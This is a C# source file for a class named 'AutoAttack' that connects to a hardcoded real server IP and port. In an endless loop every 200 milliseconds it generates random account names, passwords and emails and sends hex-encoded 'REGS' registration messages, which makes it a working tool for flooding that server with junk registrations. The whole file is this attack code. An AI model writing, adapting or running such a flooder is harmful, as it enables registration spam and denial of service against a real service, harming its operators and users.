using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace register_client
{
    class AutoAttack
    {
        private int serverPort = 10020;
        private String serverAddr = "27.148.159.33";//"27.148.158.135";//
        public byte[] dataBuffer = new byte[10000000];
        Socket client;

        String m_sAccount;
        String m_sPassword;
        String m_sEmail;
        bool m_bSvrConn = false;
        Int32 m_iAutoSplitMSec = 200;
        UInt32 m_iRegCount = 0;
        UInt32 m_iRegSucCount = 0;
        Thread m_pAutoWork;
        bool m_bAutoWork = false;
        bool m_bAutoWorkStop = false;

        private delegate void _DoRegisterBack();
        private void DoRegisterBack(String str)
        {
            
        }

        public static bool IsNumberic(string oText)
        {
            try
            {
                int var1 = Convert.ToInt32(oText);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private byte[] DoStrToHexStr(String str)
        {

            string result = "0x";
            for (int i = 0; i < str.Length; i++)//逐字节变为16进制字符
            {
                result += Convert.ToString(str[i], 16).ToUpper();
            }

            byte[] buffer = System.Text.Encoding.Default.GetBytes(result);

            return buffer;
        }
        private String DoHexStrToStr(String str)
        {

            string result = "";
            for (int i = 2; i < str.Length; i += 2)//
            {
                result += Convert.ToString(str[i], 16).ToUpper();
            }

            byte[] buffer = System.Text.Encoding.Default.GetBytes(result);

            return result;
        }

        private bool DoRegisterAction()
        {
            String msg = "REGS|" + m_sAccount + "|" + m_sPassword + "|" + m_sEmail;
            byte[] buffer = DoStrToHexStr(msg);

            return SendMessage(buffer);
        }

        private void DoCreateRegInfo()
        {
            //生成6-15位随机字符串
            string randomStr = "";
            Random rnd = new Random();
            int count = rnd.Next(6, 16);
            for (int i = 0; i < count; i++)
            {
                int ch = rnd.Next(48, 124);
                randomStr += "" + (char)ch;
            }

            m_sAccount = randomStr;
            m_sPassword = randomStr;
            m_sEmail = randomStr + "@.163.com";
        }

        public static void AutoRegisterFunc(object data)
        {
            AutoAttack dlg = (AutoAttack)data;
            while (!dlg.m_bAutoWorkStop)
            {
                if (dlg.m_bSvrConn)
                {
                    //生成信息
                    dlg.DoCreateRegInfo();

                    //注册
                    bool ret = dlg.DoRegisterAction();

                    //刷新listView
                    if (ret)
                    {//发送注册，更新列表和日志
                        //dlg.DoUpdateList();
                    }
                }
                else
                {
                    if (dlg.ServerConnection())
                    {
                        dlg.m_bSvrConn = true;
                    }
                    else
                    {
                        dlg.m_bSvrConn = false;
                    }
                }

                Thread.Sleep(dlg.m_iAutoSplitMSec);
            }
        }

        public void OnStartWork()
        {
            m_pAutoWork = new Thread(new ParameterizedThreadStart(AutoRegisterFunc));
            m_bAutoWorkStop = false;
            m_pAutoWork.Start(this);
            m_bAutoWork = true;
        }

        private bool ServerConnection()
        {
            try
            {
                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPAddress ip = IPAddress.Parse(serverAddr);
                IPEndPoint iep = new IPEndPoint(ip, serverPort);
                client.BeginConnect(iep, new AsyncCallback(Connect), null);

                return true;
            }
            catch
            {
                //MessageBox.Show("ServerConnection " + serverAddr + " 失败！");
                return false;
            }
        }

        private void ServerDisConnection()
        {
            try
            {
                client.Disconnect(true);
                client.Close();
            }
            catch
            {
                //MessageBox.Show("ServerDisConnection " + serverAddr + " 失败！");
            }
        }

        private void Connect(IAsyncResult asy)
        {

            try
            {
                client.EndConnect(asy);
                client.BeginReceive(dataBuffer, 0, dataBuffer.Length, SocketFlags.None, new AsyncCallback(RecieveCallBack), null);
            }
            catch
            {
                //MessageBox.Show("Connect " + serverAddr + " 失败！");
            }
        }


        //接收byte字节方式
        private void RecieveCallBack(IAsyncResult iar)
        {
            try
            {
                int iRx = client.EndReceive(iar);

                byte[] byte_Receive = new byte[iRx];
                for (int i = 0; i < iRx; i++)
                {
                    byte_Receive[i] = dataBuffer[i];
                    //listBox1.Items.Add(Convert.ToString(byte_Receive[i], 16));
                }
                string revStr = System.Text.Encoding.UTF7.GetString(byte_Receive, 0, iRx);
                //DoRegisterBack(revStr);

                //继续监听下一次的数据接收
                client.BeginReceive(dataBuffer, 0, dataBuffer.Length, SocketFlags.None, new AsyncCallback(RecieveCallBack), null);

            }
            catch
            {
                //MessageBox.Show("RecieveCallBack 失败");
            }
        }

        private void SendCallBack(IAsyncResult iar)
        {

        }
        private bool SendMessage(byte[] buffer)
        {
            try
            {
                //byte[] buffer = System.Text.Encoding.Default.GetBytes("");
                int snLen = 0;
                client.BeginSend(buffer, snLen, buffer.Length, SocketFlags.None, new AsyncCallback(SendCallBack), client);
                return true;
            }
            catch
            {
                //MessageBox.Show("SendMessage 失败！");
                return false;
            }
        }
    }
}
